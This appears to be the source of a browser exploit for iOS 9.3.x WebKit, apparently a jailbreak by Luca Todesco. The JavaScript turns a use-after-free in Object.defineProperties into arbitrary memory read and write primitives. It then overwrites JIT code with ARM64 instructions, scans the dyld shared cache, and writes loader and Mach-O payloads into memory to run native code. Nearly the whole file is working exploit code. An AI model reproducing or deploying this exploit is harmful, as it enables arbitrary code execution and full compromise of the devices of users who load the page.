/*
          /$$$$$$                                    /$$$$$$      /$$$$$$      /$$$$$$                   /$$$$$$  /$$   /$$
         /$$__  $$                                  /$$__  $$    /$$__  $$    /$$__  $$                 /$$__  $$| $$  | $$
        | $$  \ $$    /$$   /$$                    | $$  \ $$   |__/  \ $$   |__/  \ $$       /$$   /$$| $$  \__/| $$  | $$
        |  $$$$$$$   |  $$ /$$/       /$$$$$$      |  $$$$$$$      /$$$$$/      /$$$$$/      |  $$ /$$/| $$$$$$$ | $$$$$$$$
         \____  $$    \  $$$$/       |______/       \____  $$     |___  $$     |___  $$       \  $$$$/ | $$__  $$|_____  $$
         /$$  \ $$     >$$  $$                      /$$  \ $$    /$$  \ $$    /$$  \ $$        >$$  $$ | $$  \ $$      | $$
        |  $$$$$$//$$ /$$/\  $$                    |  $$$$$$//$$|  $$$$$$//$$|  $$$$$$/       /$$/\  $$|  $$$$$$/      | $$
         \______/|__/|__/  \__/                     \______/|__/ \______/|__/ \______/       |__/  \__/ \______/       |__/

        By Luca Todesco                                                                                                                   
                                                                                                                   
                                                                                                                */
using('liblogging');
using('libstorage');

print = alert;

//Memory r/w buffers
var mem0 = 0;
var mem1 = 0;
var mem2 = 0;
var pressure = new Array(100);
var bufs = new Array(10000);
_dview = null;
filestream = load_binary_resource("exec_fv");
var trycatch = "";
for (var z = 0; z < 0x2000; z++) trycatch += "try{} catch(e){}; ";
var fc = new Function(trycatch);
var fcp = 0;
var smsh = new Uint32Array(0x10);

function u2d(low, hi) {
        if (!_dview) _dview = new DataView(new ArrayBuffer(16));
        _dview.setUint32(0, hi);
        _dview.setUint32(4, low);
        return _dview.getFloat64(0);
}

function read4(addr) {
        mem0[4] = addr;
        var ret = mem2[0];
        mem0[4] = mem1;
        return ret;
}

function write4(addr, val) {
 	mem0[4] = addr;
 	mem2[0] = val;
 	mem0[4] = mem1;
}


var shll = new Uint32Array(filestream.length / 4);
for (var i = 0; i < filestream.length;) {
	var word = (filestream.charCodeAt(i) & 0xff) | ((filestream.charCodeAt(i + 1) & 0xff) << 8) | ((filestream.charCodeAt(i + 2) & 0xff) << 16) | ((filestream.charCodeAt(i + 3) & 0xff) << 24);
	shll[i / 4] = word;
	i += 4;
}

dgc = function() {
	for (var i = 0; i < pressure.length; i++) {
		pressure[i] = new Uint32Array(0x10000);
	}
	for (var i = 0; i < pressure.length; i++) {
		pressure[i] = 0;
	}
}

function swag() {

        if (bufs[0]) return;
        for(i = 0; i < 8; i++) {
                dgc();
        }
	for (i = 0; i < bufs.length; i++) {
		bufs[i] = new Uint32Array(0x100 * 2)
		for (k = 0; k < bufs[i].length;) {
			bufs[i][k++] = 0x41414141;
			bufs[i][k++] = 0xffff0000;
		}
	}
}

function smashed(stl) {
	document.body.innerHTML = "win! " + smsh.length;
	var jitf = (smsh[(0x10 + smsh[(0x10 + smsh[(fcp + 0x18) / 4]) / 4]) / 4]);
	write4(jitf, 0xd28024d0);
	write4(jitf + 4, 0x58000060);
	write4(jitf + 8, 0xd4001001);
	write4(jitf + 12, 0xd65f03c0);
	write4(jitf + 16, jitf + 0x20);
	write4(jitf + 20, 1);
	fc();
	var dyncache = read4(jitf + 0x20);
	var dyncachev = read4(jitf + 0x20);
	var go = 1;
	while (go) {
		if (read4(dyncache) == 0xfeedfacf) {
			for (i = 0; i < 0x1000 / 4; i++) {
				if (read4(dyncache + i * 4) == 0xd && read4(dyncache + i * 4 + 1 * 4) == 0x40 && read4(dyncache + i * 4 + 2 * 4) == 0x18 && read4(dyncache + i * 4 + 11 * 4) == 0x61707369) // lulziest mach-o parser ever
				{
					go = 0;
					break;
				}
			}
		}
		dyncache += 0x1000;
	}
	dyncache -= 0x1000;
	var bss = [];
	var bss_size = [];
	for (i = 0; i < 0x1000 / 4; i++) {
		if (read4(dyncache + i * 4) == 0x73625f5f && read4(dyncache + i * 4 + 4) == 0x73) {
			bss.push(read4(dyncache + i * 4 + (0x20)) + dyncachev - 0x80000000);
			bss_size.push(read4(dyncache + i * 4 + (0x28)));
		}
	}
	var shc = jitf;
	var filestream = load_binary_resource("loader")
	for (var i = 0; i < filestream.length;) {
		var word = (filestream.charCodeAt(i) & 0xff) | ((filestream.charCodeAt(i + 1) & 0xff) << 8) | ((filestream.charCodeAt(i + 2) & 0xff) << 16) | ((filestream.charCodeAt(i + 3) & 0xff) << 24);
		write4(shc, word);
		shc += 4;
		i += 4;
	}
	jitf &= ~0x3FFF;
	jitf += 0x8000;
	write4(shc, jitf);
	write4(shc + 4, 1);
	// copy macho
        for (var i = 0; i < shll.length; i++) {
                if(shll[i] == 0x44556677) {
                        var k=new ArrayBuffer(8*6);
                        var k8=new Uint8Array(k);
                        var k32=new Uint32Array(k);
                        var str=prompt("Real build number:", "13F69");
                        for(var si=0; si<str.length; si++) k8[si] = str.charCodeAt(si);
                        for(var si=0; si<k32.length; si++) shll[i+si] = k32[si];
        		break;
                }
        }
        for (var i = 0; i < shll.length; i++) {
                if(shll[i] == 0x33553377) {
                        var k=new ArrayBuffer(8*6);
                        var k8=new Uint8Array(k);
                        var k32=new Uint32Array(k);
                        var str=prompt("Real version:", "9.3.2");
                        for(var si=0; si<str.length; si++) k8[si] = str.charCodeAt(si);
                        for(var si=0; si<k32.length; si++) shll[i+si] = k32[si];
        		break;
                }
        }
        for (var i = 0; i < shll.length; i++) {
                write4(jitf + i * 4, shll[i]);
        }
	alert("All set. Close this alert and lock your screen to continue. See you on the other side!")
	for (var i = 0; i < bss.length; i++) {
		for (k = bss_size[i] / 6; k < bss_size[i] / 4; k++) {
			write4(bss[i] + k * 4, 0);
		}
	}
	fc();
	alert(2);
}

 function wk9364go() {
 	puts('Doing it...');
	dgc();
 	setTimeout(go_, 400);
 }

 function go_() {
 	if (smsh.length != 0x10) {
 		smashed();
 		return;
 	}
 	dgc();
 	var arr = new Array(0x100);
 	var yolo = new ArrayBuffer(0x1000);
 	arr[0] = yolo;
 	arr[1] = 0x13371337;
 	var not_number = {};
 	not_number.toString = function() {
 		arr = null;
 		props["stale"]["value"] = null;
 		swag();
 		return 10;
 	};
 	var props = {
 		p0: {
 			value: 0
 		},
 		p1: {
 			value: 1
 		},
 		p2: {
 			value: 2
 		},
 		p3: {
 			value: 3
 		},
 		p4: {
 			value: 4
 		},
 		p5: {
 			value: 5
 		},
 		p6: {
 			value: 6
 		},
 		p7: {
 			value: 7
 		},
 		p8: {
 			value: 8
 		},
 		length: {
 			value: not_number
 		},
 		stale: {
 			value: arr
 		},
 		after: {
 			value: 666
 		}
 	};
 	var target = [];
 	var stale = 0;
 	var before_len = arr.length;
 	Object.defineProperties(target, props);
 	stale = target.stale;
 	stale[0] += 0x101;
 	stale[1] = {};
 	for (var z = 0; z < 0x1000; z++) fc();
 	for (i = 0; i < bufs.length; i++) {
 		for (k = 0; k < bufs[0].length; k++) {
 			if (bufs[i][k] == 0x41414242) {
 				stale[0] = fc;
 				fcp = bufs[i][k];
 				stale[0] = {
 					'a': u2d(105, 0x1172600),
 					'b': u2d(0, 0),
 					'c': smsh,
 					'd': u2d(0x100, 0)
 				};
 				stale[1] = stale[0];
 				bufs[i][k] += 0x10; // misalign so we end up in JSObject's properties, which have a crafted Uint32Array pointing to smsh
 				bck = stale[0][4];
 				stale[0][4] = 0; // address, low 32 bits
 				// stale[0][5] = 1; // address, high 32 bits == 0x100000000
 				stale[0][6] = 0xffffffff;
 				mem0 = stale[0];
 				mem1 = bck;
 				mem2 = smsh;
 				bufs.push(stale);
 				if (smsh.length != 0x10) {
 					smashed(stale[0]);
 				}
 				return;
 			}
 		}
 	}
 	document.location.reload();
 }

 